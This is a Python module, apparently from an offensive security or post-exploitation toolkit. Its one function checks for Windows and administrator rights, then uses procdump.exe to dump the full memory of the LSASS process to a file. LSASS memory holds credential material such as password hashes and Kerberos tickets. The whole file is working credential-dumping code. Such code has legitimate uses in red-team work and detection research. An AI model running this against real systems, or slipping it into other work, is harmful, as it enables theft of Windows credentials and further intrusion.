import platform
import os
import subprocess
from colorama import Fore, Style
from utils import is_windows, is_admin

def dump_lsass(verbose=False):
    if not is_windows():
        print(Fore.YELLOW + "[!] LSASS dumping skipped (not Windows)." + Style.RESET_ALL)
        return

    if not is_admin():
        print(Fore.RED + "[!] LSASS dump requires Administrator rights." + Style.RESET_ALL)
        return

    output_path = os.path.abspath("output/lsass.dmp")
    procdump_path = os.path.abspath("bin/procdump.exe")

    if not os.path.exists(procdump_path):
        print(Fore.RED + f"[!] Missing procdump.exe at {procdump_path}" + Style.RESET_ALL)
        return

    try:
        cmd = [procdump_path, "-accepteula", "-ma", "lsass.exe", output_path]
        if verbose:
            print(Fore.CYAN + "[*] Running: " + " ".join(cmd) + Style.RESET_ALL)
        result = subprocess.run(cmd, capture_output=True, text=True)

        if result.returncode == 0:
            print(Fore.GREEN + "[+] LSASS memory dumped to: " + output_path + Style.RESET_ALL)
        else:
            print(Fore.RED + "[!] LSASS dump failed:\n" + result.stderr + Style.RESET_ALL)

    except Exception as e:
        print(Fore.RED + f"[!] Exception during LSASS dump: {e}" + Style.RESET_ALL)
